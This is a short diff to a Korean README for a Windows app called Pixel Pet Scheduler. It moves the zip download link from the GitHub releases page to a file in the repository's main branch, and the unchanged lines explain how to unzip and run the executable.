@@ -4,7 +4,7 @@
 
 ## 다운로드
 
-**[최신 버전 받기 (Windows, zip)](https://github.com/rlawnsdusqwe-design/pixel-pet-scheduler/releases/latest/download/PixelPetScheduler-win.zip)**
+**[최신 버전 받기 (Windows, zip)](https://github.com/rlawnsdusqwe-design/pixel-pet-scheduler/raw/main/download/PixelPetScheduler-win.zip)**
 
 1. zip을 받아 압축을 풀어요.
 2. `PixelPetScheduler.exe`를 더블클릭해요. 설치는 필요 없어요.
